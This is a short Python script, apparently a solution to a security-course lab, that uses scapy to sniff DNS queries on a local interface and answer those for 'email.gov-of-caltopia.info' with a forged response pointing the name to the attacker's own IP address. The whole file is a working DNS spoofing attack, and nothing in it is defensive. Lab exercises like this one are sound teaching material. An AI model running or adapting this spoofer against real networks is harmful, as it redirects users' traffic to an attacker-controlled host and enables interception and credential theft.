#!/var/lib/python/python-q4

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl

domain = "email.gov-of-caltopia.info"
our_ipaddr = get_if_addr('eth0')


def handle_packet(pkt):
    #print pkt.show()

    # If you wanted to send a packet back out, it might look something like... 
    # ip = IP(...)
    # tcp = TCP(...) 
    # app = ...
    # msg = ip / tcp / app 
    # send(msg)

    # payload = packet.get_payload()
    # pkt = IP(payload)
    
    if not pkt.haslayer(DNSQR):
        # packet.accept()
        pass
    else:
        if domain in pkt[DNS].qd.qname and not pkt.haslayer(DNSRR):
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=our_ipaddr))
            # packet.set_payload(str(spoofed_pkt))
            # packet.accept()
            send(spoofed_pkt)
            print spoofed_pkt
        else:
            # packet.accept()
            pass
    

if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='ip', iface='eth0')

